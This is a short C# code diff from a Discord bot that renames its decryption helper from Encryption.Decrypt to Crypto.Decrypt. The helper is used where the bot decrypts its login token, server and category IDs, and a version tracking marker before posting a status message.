@@ -36,7 +36,7 @@ namespace Main.Source.Bot
 
             await _client.LoginAsync(
                 TokenType.Bot,
-                Encryption.Decrypt(ConfigBot.BOT_TOKEN)
+                Crypto.Decrypt(ConfigBot.BOT_TOKEN)
             );
 
             await _client.StartAsync();
@@ -47,8 +47,8 @@ namespace Main.Source.Bot
 
         private static async Task HandleReadyAsyn()
         {
-            ulong serverId = ulong.Parse(Encryption.Decrypt(ConfigBot.SERVER_ID));
-            ulong categoryId = ulong.Parse(Encryption.Decrypt(ConfigBot.CATEGORY_ID));
+            ulong serverId = ulong.Parse(Crypto.Decrypt(ConfigBot.SERVER_ID));
+            ulong categoryId = ulong.Parse(Crypto.Decrypt(ConfigBot.CATEGORY_ID));
 
             var server = _client.GetGuild(serverId);
             if (server == null)
@@ -255,7 +255,7 @@ namespace Main.Source.Bot
 
             string marker = ConfigVersion.TRACKING.Length == 0
                 ? ""
-                : Encryption.Decrypt(ConfigVersion.TRACKING);
+                : Crypto.Decrypt(ConfigVersion.TRACKING);
 
             var message = new StringBuilder();
             message.AppendLine($"{(elevated ? "@everyone" : "@here")} [{ConfigVersion.MAJOR}.{ConfigVersion.MINOR}.{ConfigVersion.PATCH} - {marker}]");
